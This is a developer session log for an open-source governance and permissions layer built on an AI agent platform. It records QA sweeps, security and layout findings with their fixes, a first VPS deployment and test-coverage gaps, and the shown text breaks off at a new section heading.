# Session log: September 2026

What changed in September 2026, and why. Companion to
`mg/SESSION-LOG-2026-08.md`, which covers the month before it. `HANDOFF.md` §1
carries the dated state; this file carries the narrative.

---

## 2026-09-03: the deployment, and what a cold machine found

**The day the project left this laptop.** Two QA sweeps in the morning, then the
fork was installed on a Contabo VPS from a clean Ubuntu 24.04 image. The first
time anybody has followed `LINUX-INSTALL.md` end to end on a machine that had
never run any of it.

**It found three defects in one evening**, and their shape is the result rather
than the individual bugs.

### The morning: two sweeps, findings 225–229

**The tenth sweep changed what counts as evidence.** Nine sweeps of reading had
each ended by finding a test that asserted something it could not detect (206,
221, 224). Reading cannot measure how widespread that is, so this one broke the
code on purpose: **fifteen deliberate breakages across six security-critical
features, all fifteen caught.** That is the strongest positive statement this
project has about its own verification, and it is a different claim from "the
suite is green".

Reading the same six features alongside found **225**, the login throttle's
1,000-key memory bound was the whole control's off switch, measured at 500
guesses without a lockout, and **226**, a failed `governance login` recorded
nowhere at all. **227 and 228** were registers describing a system that had
moved, including this project's own handoff.

**The eleventh sweep changed which half of each module it read**: the failure
branch, the code that only runs when something else has already gone wrong.
**229**, `deleteOrganisation` guarded everything up to the point of no return
and nothing after it, so a corrupt attachment index turned a completed,
irreversible deletion into a reported failure on both surfaces. Two siblings had
the same shape and were fixed with it.

### The evening: the VPS, and three defects nobody could have read

**230. The dashboard had not built since 2026-09-02.** `ui/vite.config.ts`
keeps a hand-maintained list of module aliases; finding 213's fold added an
import to the browser and no line was added with it. The catch-all alias then
rewrote the import into a path with a _file_ in the middle of it. Nothing caught
it because the UI **typecheck** resolves through tsconfig `paths`, a different
mechanism, which stayed green, and `pnpm ui:build` is not one of the six
documented verification commands.

**231, `--with-node` left the runtime off `PATH`.** nvm puts Node in a
per-user directory reached through `~/.bashrc`; the installer sourced it into
its own shell, built successfully, and exited. `openclaw` is a symlink to a file
whose shebang is `#!/usr/bin/env node`, so the very next command in the runbook
failed. The installer already symlinks `openclaw` into `/usr/local/bin` **under
a comment explaining that systemd does not read shell profiles**, and had
applied exactly half of its own argument. Fixed, and then fixed again: the first
fix linked `node`, `npm` and `npx` and not `corepack`, which broke the _second_
install rather than the first.

**232. Root was the one uid the D-Bus rescue skipped.** `openclaw daemon
install` failed with _"Unit file openclaw-gateway.service does not exist"_ about
a file that `ls` showed and `systemctl --user enable` accepted by hand.
`resolveSystemctlProcessEnv` fills a missing `DBUS_SESSION_BUS_ADDRESS` when the
bus socket exists and returned early for uid 0. Invisible on a desktop, where
`pam_systemd` sets it at login, and fatal on a server with no login session.
With that value missing the scope resolver falls through to
`--machine root@ --user`, which cannot see a unit under `/root/.config/`. This
one is **upstream's code**; the fork carries the patch and
`UPSTREAM-BUG-REPORT.md` carries the reproduction.

A fourth, not numbered because it is documentation rather than code: **§4's
`loginctl enable-linger` step comes after the two commands that need it.** On a
cold server neither can work until it has run.

### What the three have in common, and it is the finding

**The path a new operator actually takes was the path nobody had walked to the
end.** Every earlier verification ran on a machine that had already been used
for something else, Node already on `PATH`, a login session already
established, a dashboard already built. None of the three could have been found
by more reading, more tests, or another sweep of the code. They needed a
stranger's machine.

That generalises the rule findings 137, 224 and 230 each state about tests, a
check that stands in for something it does not exercise, and applies it to
**deployment instructions**. A runbook is only tested by a cold machine.

`docs-notes/LINUX-INSTALL.md` §2c now states all four as instructions rather
than leaving them as troubleshooting.

### Where the day ended

The Gateway is **running as a systemd user service on the VPS**, lingering
enabled, reached through an SSH tunnel, with the dashboard's Gateway gate passed
and the create-the-first-Root form on screen. `openclaw governance policy show`
answers _"Not signed in"_ rather than _"unknown command"_, which is the proof
the fork is what is deployed, and the governance gate refusing an
unauthenticated caller exactly as designed.

**Not yet done: the Root account, the Kimi credential, the first provisioned
agent, and the live run.** Those are the next session, and T2 remains the
highest-value item on the project.

### Backlog

**T45–T48 added** at Kinan's direction: a first-run installation guide for a
newcomer, governance-specific setup wizard text (the wizard still says
"OpenClaw" and never mentions what this project is), a by-hand test plan across
the four RBAC tiers split between K, M and O, and a judgement on whether
Chapter 3 is ready to be written.

---

## 2026-09-03 (later): two sweeps, and the inspector who never came

**Findings 233–238, all fixed.** Three sweeps' worth of work in one evening, and
the most valuable part of it came from two pages of this project's own paperwork
contradicting each other.

### The conflict, and running the thing instead of reading about it

`HANDOFF.md` §1 said finding 221's 38 lint errors were fixed and both shards
clean. `HANDOFF.md` §4 said the gate **FAILS on two shards with 38 errors** and
called them **open**. Same file, same day, opposite claims.

**236** is the small half: the closure had reached §1 and none of the five other
live copies, §4's table, §4's prose, `PROJECT-SUMMARY.md` twice,
`CHAPTER3-MATERIAL.md` (still headed _OPEN_) and `GOVERNANCE.md`'s command box.
One fact, six copies, one maintained. Findings 227 and 228 for the third time in
two days.

The other half came from running the gate rather than picking a side.

**233. It could not finish, and never had.** Every oxlint shard passed and then
`run-lint.mjs` died: `spawnSync … node_modules\.bin\stylelint ENOENT`. The first
two of its three steps launch their tools through `process.execPath`; the third
launched stylelint through the extensionless `.bin` shim, which `spawnSync` on
Windows cannot execute without a shell. So the gate's **third step, the CSS
hygiene check that exists because oxlint cannot see inside Lit `css` templates,
had never once run on this machine**, and the whole command had been exiting 1
for a reason indistinguishable from a lint failure. Fixed. Run by hand
afterwards, the CSS check is clean; nothing was hiding behind it, and nobody
could have known that.

**The repaired gate then caught four defects in the change that repaired it.**
Its first complete run failed with four `no-shadow` errors, every one introduced
by findings 234 and 235's own fixes. A dynamic import shadowing the module's
import of the same name, and a `.map((agent) => …)` shadowing the commander
sub-command variable. Both typechecks were clean, the suite was green, and the
plain oxlint the hook runs does not report them. **A gate that has never run is
indistinguishable from a gate with nothing to find, until the first time it
runs.**

**And the sixth verification command caught a second one, in a test written for
this very sweep.** `tsgo:core:test`, the typecheck over test files that T37 and
T39 added, because until 2026-08-31 no test in this project was typechecked by
anything, rejected `expect(outcome.reason).toBe("not-found")`: `cancelled`
discriminates the union, so `reason` is not a property of the success arm and
`expect(...).toBe(false)` does not narrow it. The test **passed at runtime**, and
would have gone on passing. Rewritten as one `toMatchObject`, which is both the
style the neighbouring tests use and the form that is sound.

Two verification steps, two defects, both in the same evening's own work. That is
the strongest argument this project has for keeping checks that look redundant.

**237 is the one that matters.** Five registers describe that command as _"the
gate, and what `git-hooks/pre-commit` runs"_. The hook is live, `core.hooksPath`
is `git-hooks`, and it runs exactly two things: `oxfmt --write`, and
`oxlint --config .oxlintrc.json` over staged files. It has never invoked
`run-lint.mjs`. That is the **narrow, non-type-aware invocation finding 221 was
written to distrust**: no `--tsconfig`, no `scripts/`, no stylelint. So the
type-aware rules, the project's own scripts folder and the CSS check are
**enforced by nothing automatic**, and 233 is what happens to a command nobody
is required to run.

### The two sweeps

Both drew deliberately different axes, and both found the same class from
opposite directions.

**The twelfth** re-ran the ninth sweep's capability draw, 44 routes extracted
from source, twelve drawn from the 32 not previously taken. Ten of twelve clean
on all four axes. **234**: a mechanical pass over every id-taking command asking
only _does its body mention `groupId`?_ flagged two of twenty-two, and one was
real. `governance set-policy-authoring` took the caller's permission from
`requireCliActor` and dropped the organisation that came with it, writing to any
account on the installation, and then rewrote that account's live session
whether or not the write had been allowed. Its HTTP twin refuses the identical
request under a comment describing this exact attack.

**The thirteenth** drew an axis no sweep had used: **installation-wide state, and
whether every reader scopes it by organisation**. Chosen because M5 made
isolation a property of the filesystem, so what remains at risk is whatever is
_not_ a file. Five module-level stores; four fine. **235**: the prompt-run table
is machine-wide and its two readers filtered with `canManageAgent`, which
`hasUnlimitedAgentScope` makes unconditionally true above the User tier. That is
**finding 139 exactly**, the same defect, the same predicate, the same class of
registry, in the one place 139's fix never reached. Three comments in that area
promised protections that were absent, including a route comment ending _"the
scope check that follows"_ where nothing followed.

**Both 234 and 235 are graded latent and that grading is the honest part.** A
shipped installation caps at one organisation, so there is no second organisation
to reach; both needed `setMultiOrganisationAllowedForTests` to reproduce. They
are fixed anyway, because the cap is recorded as _"a product decision rather than
a security boundary"_ beside a claim that M5's isolation is _"untouched and still
enforced"_, and in these two places it was not.

### And a sixth, from the axis nobody expects to produce anything

**238** came from the twelfth sweep's fourth question, _does the documentation
describe it accurately?_, and is the largest of the six.

`CLI-REFERENCE.md` states in one place that there is _"deliberately **no**
`governance agent cancel` command"_, because the table of in-flight prompts
"lives inside the process running them" and a command that looked like it could
reach the Gateway's runs "would be reporting a power it does not have". It then
documents that command in two other places.

**The prose was right and the commands were built anyway.** `prompt-runs.ts`
keeps its table in a module-level `Map`, no file, no Gateway call, and both
commands call it in their own process. Measured with a two-process probe:
`PARENT sees runs: ["gov-run-probe"]`, `CHILD sees runs: []`. A CLI invocation is
always a fresh process, so **neither command can see anything the Gateway is
running**, which is every prompt sent from the dashboard, and `cancel` answered
_"no run is in flight"_ about runs that were.

`governance kill` is the contrast that proves it: a lockdown is written to the
policy document, so it works from any process. The run table is the one piece of
governance state that is memory-only.

Nothing caught it because **every test of the pair asserts the empty case. The
only case they can reach.** A test that started a run and cancelled it would pass
in one process and prove nothing, which is finding 224 arriving from the other
side: there a test measured the host, here it would measure its own process.

It fails closed, so it is not filed as security. It lands at the worst moment
anyway: finding 222 established that the command line is the surface that works
when the tunnel does not, and an incident is exactly when the tunnel is missing.
Both commands now say what they cannot see; whether the CLI should reach the
Gateway's runs is **T51**.

### What the six say together

**Every one of them was described before it was measured.** A comment said a
check followed. Five documents said a hook ran a command. A register said errors
were open. Each was written honestly and each had stopped being true, and nothing
objected, because a description costs nothing to keep and a measurement has to
be re-taken.

The tenth, eleventh and twelfth sweeps each said a version of this about _tests_.
This one says it about **the checking machinery itself and about the project's
notes on its own state**. The last places anyone looks, because they are what
you look with.

### Backlog

**T49, T50 and T51 added.** T49 is Kinan's: with one organisation per installation,
M5's isolation is exercised by nothing that ships, and today's two findings were
latent for exactly that reason, so decide whether the report calls it verified
by test or states the cap as the boundary. T50 is the decision 237 forces:
whether anything should actually enforce the full gate, or whether the registers
should stop calling it "what the hook runs". **T51** is finding 238's: whether
the command line should reach the Gateway's runs at all, which means giving it an
HTTP client no other governance command needs. The backlog is now **T1–T51, 38
done, 11 open, 2 not being done**, **T45 was done the same night**
(`docs-notes/FIRST-RUN.md`).

---

## 2026-09-04: the dashboard, driven by the person using it

**Kinan signed in as Root on the VPS and started using the thing.** Everything
below came out of that hour, which is worth saying plainly because it is the
second time in two days that operating the system found what reading it did not.
The VPS trip on 2026-09-03 found three defects nobody could have read. This is
the same axis one layer up: not "does it install" but "can somebody use it".

**Two defects, 239 and 240**, and a list of changes that are requests rather than
bugs.

### 239: an agent that could not be created

Root filled in the create-agent form, pressed the button, and got:

> The agent could not be given an owner: agents are owned by an Administrator

That refusal is correct. M4's rule is that every agent answers to exactly one
Administrator, and Root is deliberately not eligible, because allowing it would
mean two statable rules instead of one. **The defect is that the form gave no
way to satisfy it.** There was nothing on the screen to name an owner with, and
no message saying what to do instead.

The capability existed on every other surface. The route has accepted `adminId`
since M6, the command line has had `--owner <accountId>` for as long, and the
panel's own props already carried `administrators`, annotated **"Accounts that
may own an agent, for Root's owner picker"**. There was no owner picker. That
comment described a control nobody had built, which is finding 218's class and
findings 235's, arriving in the props of the panel that needed it.

This is also the fourth time this project has shipped a working route with no
affordance, and the panel's own header says so: _"a capability is finished when
something an operator can click uses it, not when the route returns 200."_ The
header was right and the file was the counterexample.

**Fixed**: a dropdown of the organisation's Administrators, shown to Root only,
because an Administrator creating an agent owns it and the route already
defaults to the caller. With no Administrator in the organisation the form says
**"First create an Administrator account in Accounts"** rather than offering an
empty picker, and the button stays disabled until an owner is chosen, so the
form cannot reach the server in a state the server will refuse.

### 240: text boxes that could not show their own text

Placeholders were cut off mid-word (`Optional, OpenClaw ch`), and on the accounts
row the **"Create account" button was rendered outside the visible edge** and
could not be clicked at all.

One cause for both. `.settings-row__control` sets `align-items: center` and
disables wrapping, which is right for the short right-aligned controls the
settings surface was built for. The governance panels put long placeholders and
four-control clusters into it. In a **column** (the stacked create-agent form)
`align-items: center` is the cross axis, so every input shrank to its intrinsic
width, which for an `<input>` is its default `size` attribute and has nothing to
do with the placeholder it was given. In a **row**, no wrapping meant the last
control in a crowded cluster had nowhere to go.

**Fixed in two halves, and both are needed.** Widen where there is room:
stacked controls stretch, inputs get a `min(100%, 24ch)` floor, and rows wrap
instead of clipping. Where there is not room, hand the reader the text on hover:
`lib/input-overflow-title.ts` gives any text box in the Control UI a `title` when
its own text does not fit, measured against the element's computed font with a
canvas.

**The canvas is not gold-plating.** `scrollWidth > clientWidth` is the usual
overflow test and it cannot see this: for an `<input>` it reflects the _value_,
and the string being clipped is almost always the _placeholder_, so an empty
input reports no overflow however long its placeholder is.

Pinned by `governance-textbox-fit.browser.test.ts` in real Chromium, because
jsdom reports every width as zero and the same assertions there would pass
against a page with every placeholder clipped: finding 224's lesson exactly. The
assertion is deliberately a disjunction, **fits or is labelled**, because
"always fits" would fail honestly on the crowded rows and "always labelled"
would let the layout rot as long as tooltips appeared. Verified by mutation:
removing the tooltip fails three of the six.

### What was asked for, and built

|                            |                                                                                                                                                                                                                                                                                                                |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **The page names itself**  | A `page-title` header matching Privacy & Security exactly (same class, same `rgb(255, 92, 92)`, same 22px), a one-line description, and Learn more. It renders before sign-in too, because a page that only names itself once you are signed in reads as a different page than the one the sidebar sent you to |
| **Learn more points here** | `https://github.com/KinanRadaideh/openclaw-governance-layer`, on both the sign-in screen and the signed-in page. Upstream's security docs describe upstream, and a fork's gate is not documented there                                                                                                         |
| **Section order**          | Accounts to the top, above the agent sections. The emergency kill switch directly below Active agent sessions, beside the panel showing the thing you need to stop. Deployment and network posture last                                                                                                        |
| **A section jump-nav**     | A sticky, independently scrolling list of the page's sections, distinct from the settings sidebar: that one moves between pages, this one moves within Governance. **It reads the rendered page rather than a hand-written list**, so it cannot offer a Viewer a link to Accounts                              |
| **Approval timeout**       | Widened from Root to **Administrator and above**, matching every other installation-wide policy setting, and a new **per-agent** axis so a User can set it for the agents assigned to them                                                                                                                     |
| **No em dashes**           | 7,983 removed across 234 files this project wrote                                                                                                                                                                                                                                                              |
| **README**                 | Rewritten for this project: what OpenClaw is, what the layer adds and how, and install directions that say it is built for Linux                                                                                                                                                                               |

### The approval timeout needed a new axis, not a wider check

Kinan asked for Administrator and Root, "as well as User for the agents they've
been assigned". The first half is a tier change. **The second half had nowhere to
live**: the timeout was one installation-wide number, and "a User sets it for
their own agents" cannot be expressed on a global value.

So `agentHitlTimeout` was added beside `agentMode` and `agentAsk`, which already
split on exactly that axis, and `policy-types.ts` already stated the authority
model for it: _"a User may set it for an agent assigned to them, an Administrator
for any agent or installation-wide, and Root inherits both."_

The route sits at the **User** floor with `canManageAgent` and
`requireAgentInGroup` beyond it. `canManageAgent`, not
`canAuthorPolicyForAgent`: setting how long your own agent's escalation waits is
acting on a workload you are responsible for, not changing the rules it is
judged by, so a User whose policy authoring Root withheld keeps it. That is
T27's distinction, and reaching for the neighbouring predicate would have merged
the two again.

Widening the installation-wide half is a **recorded divergence** from §1.6, which
puts the window under Root. §1.6 is preliminary design the implementation is
permitted to differ from; §1.3's nine requirements are not, and this touches
none of them.

The engine's timeout lookup was inline at both call sites and is now
`resolveHitlTimeoutMs`, exported. Not tidying: an inline expression can only be
exercised by driving a real escalation and waiting for it, which measures the
clock rather than the lookup.

### On the em dashes

7,983 across 234 files, and the interesting part is the scope decision. "The
project" could mean every file in the repository, which would rewrite upstream's
3.3MB changelog and its documentation for no benefit and a very large fork diff.
So the boundary is **files this fork wrote**, derived rather than judged:
`git diff --name-only main...HEAD`, filtered to the governance source, the
governance UI, `mg/`, `docs-notes/` and the root documents. **42 upstream files
this project merely patched were left alone**, and that is stated here so the
next reader knows the remaining em dashes are upstream's rather than missed.

**Every operator-visible string was then read by hand**, at Kinan's direction,
because a mechanical pass is graded on the average and an operator reads one
string at a time. Sixteen were rewritten. The worst was `emptyValue`, a lone dash
meaning "no value" that became `", "` and rendered as a stray comma on screen:
the glyph rule that catches exactly that case was written _after_ `en.ts` had
already been swept, so the locale file was the one file processed by the least
refined version of the script. The rest were legibility rather than breakage. A
comma splice in the Root password warning, status chips reading as two sentences
("Intact. Entries verified"), an inline value that became a sentence break
("root. Permanent, cannot be changed" -> "root (permanent, cannot be changed)"),
placeholders that disagreed with the one beside them, and three fragments in the
Codex panel's prose.

### And the gate caught this session too

The full lint gate refused the work twice, both times on the new code rather
than the swept prose.

**Six `no-promise-executor-return` errors** in the browser test: `new Promise((r)
=> setTimeout(r, 50))` returns the timer id from the executor. Harmless here and
a real trap in general, and nothing else in the verification set looks for it.

**Two files over the 700-line limit**, both pushed there by the per-agent
timeout: `governance-dashboard-api.ts` at 752 code lines and `policy-panels.ts`
at 761. That is finding 136's exact mechanism, and T16's answer to it was to
split rather than to suppress, so:

- The route moved to `governance-dashboard-agent-control.ts`, whose stated rule
  it already matched verbatim: _"User tier or above, and you must manage this
  agent."_ It should arguably have been written there in the first place. Its
  `isSafeObjectKey` helper became `governance/object-keys.ts`, because two route
  files now need it and the file it lived in imports all of them, which is the
  circularity `governance-dashboard-group.ts` was split out to avoid.
- The dashboard row became `panels/policy-agent-timeout.ts`, which is precisely
  why `policy-root-settings.ts` exists: the same limit, the same gate, the same
  answer, eleven days apart.

**Neither would have been caught before 2026-09-03**, because the gate could not
finish on Windows (finding 233) and nothing automatic runs it (finding 237). Two
days after being repaired it has now refused four separate changes, every one of
them mine.

**The lesson is about ordering rather than about dashes.** The script improved
three times while it ran, and the file swept first got the worst of it. A
transformation applied to 8,000 sites should be finished before the first site is
touched, or every file has to be re-read anyway.

The replacement is contextual, not a blind delete. A pair inside one sentence is
a parenthesis and becomes commas; a heading or a list label takes a colon; an
independent clause becomes a new sentence; a lone dash used as a glyph, in a
string that is only the dash or in an empty table cell, becomes a hyphen. The first pass got three of those wrong,
which is why there was a second and a third.

---

## 2026-09-04 (later): the dashboard measured, and the check that never ran

**Kinan kept using it and reported seven complaints in one message.** Every one
was a layout defect: widgets too close together, headings sitting on the card
above them, buttons and text boxes running off the edge of the panel they belong
to, two explanatory disclosures pressed against the card border or spilling out
of it, an awkward collision where Policy meets the Audit ledger, and one
question that turned out not to be a defect at all.

**Ten findings, 241 to 250.** Nine are the dashboard as an operator sees it. The
tenth is why none of the other nine could have been caught.

### The one that was not a bug

_"Some built-in rules have a Switch off button and some don't. Why?"_

Working as designed, and the design is T24's split core tier: most shipped
denials are ordinary security opinions Root may switch off, and the rest are
what stop a governed agent reaching the policy, the accounts, the ledger and the
signing key. The server refuses those for every account including Root.

**But the page said none of that** (finding 247). It rendered nothing at all
where the button would be, so an operator saw buttons appearing on some rows and
not others with no way to tell which rule they were looking at or why. "The
button is missing" is indistinguishable from a page that failed to render half
its controls, which is the exact reasoning the Root account row already uses for
"root (permanent, cannot be changed)" one section higher up. Now the row says
"Cannot be switched off" and a row above the list explains the tier once.

### The nine

**241, the page had no section spacing at all.** `settings.css` separates
sections with a gap on `.settings-page` and a `> .settings-section +
.settings-section` margin. Both are **child** selectors, and this page puts its
sections two levels down, inside the jump-nav layout. Neither ever matched, so
thirteen panels stacked flush against each other and "ACCOUNTS" printed hard
against the bottom edge of the Identity card.

**242, one defect behind four of the seven complaints.** Several panels hand
`renderSettingsRow` a control that is itself a `div` carrying
`class="settings-row__control"`, so the class lands twice. It carries
`flex: 0 0 auto`, right for the outer cell and wrong for the inner one: with no
shrink and an `auto` basis a wrapping flex container resolves to its
**max-content** width and refuses to come back down. The cluster rendered at
whatever its widest line wanted, ran past the card, and `.settings-group`'s
`overflow: hidden` cut it off, which is why the _last_ control in each cluster
was the one missing. "Set password", the create-account fields, the rule-request
form and the folder-grant explainer were all this.

**243, the page was not `wide`.** A 13.5rem jump-nav plus page padding inside a
760px column leaves roughly 490px of body, narrower than the control clusters it
has to hold. `.settings-page--wide` exists for exactly this case.

**244, the two disclosures had no CSS whatsoever.** Neither
`.governance-codex-learn-more` nor `.governance-folder-grant-learn-more` appears
in any stylesheet in the repository. The Codex one renders as a direct child of
`.settings-group`, a surface with no padding, so nine paragraphs sat flush
against the card border; the folder-grant one sits inside the cluster of 242 and
was laid out as one very long line.

**245, two hint classes used at six call sites and defined nowhere.**
`.settings-row__hint` and `.settings-hint`, across three panels: the Codex search
caveat on a rule, "pick one of your agents", the list of rules a folder grant
wrote, and "no Administrators yet". All rendered at full body weight, so a note
meant to sit _beside_ a decision read as part of it.

**246, the audit ledger put five controls in a header slot sized for one.**
`space-between` then squeezed the heading into a two-line column beside a
two-line button block. Three or more actions now take their own line, which is
what the rule list already does with its filter row.

**248, every primary and every destructive button on this page has been
unstyled since it was written, and this is the serious one.** The design system
defines `.btn.primary` and `.btn.danger`. The governance panels used **four**
spellings of neither: `btn--primary`, `btn--danger`, `btn-primary`,
`btn-danger`, twenty call sites. Measured in Chromium, "Delete" computed
byte-identical to a plain button, same background and same colour, against a
real danger style of red text on a red wash.

**On a security console that is not cosmetic.** Delete an account, delete the
organisation, switch off a shipped core denial, reject a rule request, stop an
agent: all of them looked exactly like "Who does this affect?". The ledger's
active filter had the same problem. `aria-pressed` was set correctly, so a
screen reader knew which filter was on and a sighted operator did not.

**249, the dashboard never read `canAuthorPolicy`, so T27 was invisible.** The
identity route has sent it since the switch was built, `api.ts` declares it with
the note "absent means allowed", and every authoring route enforces it. The page
gated its authoring controls on `canManageAnyAgent`, which answers _does this
tier touch agents at all_. So a User whose policy authoring Root had withheld
still saw the add-rule form, the folder-grant form and a Remove button on every
rule, and learned they could not use them only from the refusal. T27 exists
precisely to separate _may I act on this agent?_ from _may I change the rules it
is judged by?_, and the dashboard was answering only the first. Fixed with
`canWritePolicy` in `identity.ts`, the browser twin of `permissions.ts`.

**250, three posture controls kept a gate the server had moved.** Finding 218
raised `policy/agent-ask` and `policy/agent-mode` to
`requireRole(..., "administrator")`. The dashboard kept them on the User gate, so
a User saw "Observe one agent" and a "Use default" on each override row, and
every one came back 403. The neighbouring per-agent escalation timeout was
checked and is correctly still on the User gate, for the reason its own header
states.

### The finding underneath all of them

**The one test in this project that can see layout has never run.**

`governance-textbox-fit.browser.test.ts` is in the documented verification set.
The first of the six commands includes `ui/src/pages/governance/`. It runs there
through the **root** vitest config, which is jsdom, where every width is zero,
so its own `skipIf` guard turns it off. The default reporter prints `2 skipped`
and exits `0`.

It runs only under the ui package's `--project browser`, which needs
Playwright's Chromium, and **`%LOCALAPPDATA%/ms-playwright` does not exist on
this machine**: the browsers have never been downloaded, so every
`.browser.test.ts` in the repository has never executed here.

That is finding 203's shape one config over. There a glob silently matched
nothing and the undercount looked like a passing run; here the file is
collected, skipped, and the skip is a number nobody reads. It is the fifth
instance of this project's central pattern after T25, T19, T29 and findings 136
and 137: **a check that looks like coverage and never executes.**

**And it explains the whole day.** Finding 240 was fixed on 2026-09-03 _with a
test written into that very file_, and the operator reported the same class of
defect the next morning. Worse, the test it added measured the wrong edge: it
asserted that no control sits outside `document.documentElement.clientWidth`
while the harness gives the page 1100px inside a wider viewport. Nothing was off
the _screen_; everything was off the _card_, and the card is what clips.

Three assertions were added and the wrong-edge one kept beside a correct twin:
against the clipping card rather than the viewport, against an opened
disclosure, and against the gap between sections. `mg/HANDOFF.md` §4 now carries
the browser command and its Playwright prerequisite as a seventh verification
step.

### How the nine were found, and the method worth reusing

**A harness, not a test.** `governance-page.ts` is a light-DOM custom element,
so it can be mounted in a Vite dev server against a stub, with no Gateway, no
token and no sign-in, and driven at `?role=root|administrator|user|viewer` and
`?state=full|empty|gate`. Every combination is a screen an operator can reach and
none of them had ever been rendered in a browser.

Then measure rather than look: for every element inside every `.settings-group`,
is its box outside the group's box? Zero at 1280, 1024, 880 and 640, in both
themes, at every tier, is a different claim from "it looks fine".

**The systematic pass that found 245 and 248** is the one to repeat on any
markup-plus-stylesheet pair: extract every class name the templates put into the
DOM, extract every class name the stylesheets define, and subtract. Eleven names
came back, four of them regex artefacts of the extractor and **seven of them
real**. Two of those seven were the danger and primary button styles on every
destructive control in a security console.

The harness was deleted afterwards. The durable form of it is the new assertions
in `governance-textbox-fit.browser.test.ts`, which say the same things and can
fail on their own, _provided somebody runs Playwright's installer first_, which
is the finding this whole section is about.

### What was run

Governance suite **2,723 passed / 14 skipped across 149 files**, exit 0, from
Git Bash per finding 203's warning. Both typechecks clean, stylelint clean,
oxlint clean, `ui:build` plus its precompressed-asset and performance checks
clean. The full UI package suite reports **14 files / 23 tests failing**, all in
chat, channels, plugins, model-setup, workboard and board, **none in
governance**, and `git diff main...HEAD` shows every one of those files untouched
by this fork: upstream tests failing on upstream code, identical before and after
this session's changes.

---

## 2026-09-04 (later still): the browser tests run, and six features driven for real

**Playwright's Chromium was installed, and every `.browser.test.ts` in the
repository ran for the first time: 22 files, 192 tests, all passing.** Until
this afternoon none of them had ever executed on this machine. That closes
finding 250 as a gap in the checking machinery rather than merely documenting
it.

### What the layout test found the moment it could run

Nine assertions, and **two failures on the first run, both real.**

**The first was the fixture, and it is the larger of the two.** The new
disclosure assertion failed with "expected 0 to be greater than 0" — there were
no disclosures on the page to open. `rootState()` had no `policy` at all, and
`renderPolicySection` returns early without one, so **the largest section on the
page had never been on the page these layout assertions measured**: the rule
list, its filter, the authoring form, the folder-grant panel and the Codex
panel. Every finding this file exists to catch could have been sitting in it.
Found by a guard written the way the first test in the file is written, which is
the argument for writing them that way.

**The second was a defect, and it is visible in the screenshot Kinan sent this
morning.** With a policy on the page, the authoring form appeared, and
"Minutes (blank = never expires)" measured as clipped with no hover fallback —
in his screenshot it reads "Minutes (blank = r", beside "Agent id (blank = all
ager".

Both halves of finding 240's fix were defeated on those two fields at once, and
the mechanism is worth recording:

- **Widening could not happen.** Both carried inline `max-width` caps, 9rem and
  11rem, chosen when the page body was about 490px wide and widening one field
  pushed the Add rule button off the edge. The page is `--wide` now and the
  cluster wraps, so the cap was protecting against a layout that no longer
  exists.
- **Labelling could not happen either.** `applyOverflowTitle` never overwrites a
  `title` somebody else authored, which is right — an authored title says
  something the placeholder does not. The lifetime field has one
  (`ttlHint`), so the fallback correctly declined, and the field ended up with
  neither treatment.

Fixed by removing both caps and giving the fields inside a stacked cluster a
`31ch` floor, which is what their placeholders actually need. The general `24ch`
floor is about 168px and the sentences need roughly 190px, which is why they
were clipped even with the caps removed.

**The residual is worth stating rather than fixing.** An input that carries an
authored hint _and_ a clipped placeholder still gets no placeholder tooltip.
Here that is harmless — `ttlHint` says "Leave blank for an indefinite rule that
never expires", which is exactly the part being cut off — but the general shape
is a gap in the fallback, and the honest answer if it recurs is to append rather
than decline.

### The feature sweep: six features, driven rather than read

`docs-notes/qa-sweep-2026-09-04/feature-sweep.ts` drives the production modules
in a throwaway governance directory and asks the operator's question: given a
fresh installation, does the thing work? **Twenty checks, twenty passed**, and
two of them are adversarial rather than confirmatory.

**Tamper evidence, attacked rather than asserted.** The ledger is appended to,
verified, and then **edited on disk** the way somebody covering their tracks
would: one `"decision":"deny"` flipped to `"allow"`, everything else left alone.
Detected at entry #6, _"entry hash does not match its own recomputed content
hash"_. Then restored and the **last line deleted instead**, which a hash chain
alone cannot see: detected by the checkpoint, _"ledger ends at entry 15 but the
checkpoint records entry 16: 1 entry was removed from the end"_. Requirement 8's
central claim, measured against both attacks it names.

**Finding 225, re-run as the attack.** Five wrong passwords lock an account out;
then **3,000 invented usernames** are pushed through the throttle table to try
to evict that lockout, which is exactly what worked before the fix. It survived.

The other eighteen: four tiers created with one Root enforced inside the write
lock; a second Root refused; case-insensitive sign-in (`KINAN` authenticates as
`kinan`); the permission model at every tier including a withheld User; ten core
denials in force on a fresh install with the posture already `enforce`; T24's
split tier, where switching off an ordinary core denial works and a
self-protecting one is refused; an operator rule added and removed; a kill
switch written as `Scout` and stored as `scout`, which is finding 202's exact
mechanism; and a rule request submitted by a User, decided by an Administrator,
and **refused a second decision** so the first stands.

**One check failed on the first run and it was the probe, not the product**:
`decideRuleRequest` takes a params object rather than positional arguments, so
the id never reached it and the function returned `undefined` — silently, which
is correct for an idempotent decide but is exactly the shape that hides a real
defect. The fix turned it into two checks rather than one, because the
double-decide case was worth asserting once the signature was understood.

### T47 written

`docs-notes/T47-TEST-PLAN.md`. 138 checks: one list per tier for Kinan
(Root), Mohammad (Administrator) and Malek (User, then Viewer), plus a section
of six things **no one person can test alone** — an Administrator stopping a
User's agent mid-prompt, a password changed under a live session, authoring
withheld while a rule is half-typed, an account deleted while its holder is
signed in.

Two instructions run through every row. **Was the outcome visible?** — an action
that produces nothing with nothing explaining why is this project's worst bug
class, and it is invisible to every automated check here. **Did the refusal say
what to do instead?** — "You cannot do that" is a half-finished refusal.

The plan also insists on **three machines, not one browser**: half of what it
tests is that one account cannot see or do another's, and a shared session
silently defeats that. And it asks for a screenshot of every refusal, because
Chapter 4 needs pictures of a system saying no.

**Row 2.1.5 is the one to read.** Everything the dashboard hides from an
Administrator, they are asked to call directly with `curl` using their own
session, because hiding a control is a courtesy and never the control. That is
the difference between the page being polite and the layer being sound, and it
is the only row that can tell them apart.

---

## 2026-09-04 (evening): the repository went public, and what that moved

**Kinan made `KinanRadaideh/openclaw-governance-layer` public.** The reason is
the dashboard's **Learn more** link: it points at that repository from both the
sign-in screen and the signed-in page, deliberately, because upstream's security
docs describe upstream and a fork's gate is not documented there. Pointing at a
private repository made it a 404 for **every reader the link exists to serve**,
which is worse than no link at all — a link that cannot open is a promise the
page does not keep.

**Verified rather than taken on trust**, which is this file's standing rule:
`GET /repos/KinanRadaideh/openclaw-governance-layer` returns `"private": false`
and the repository page answers `200` with no credentials at all. The link now
resolves for a stranger, which is the only test that matters for it.

### The instruction it overruled

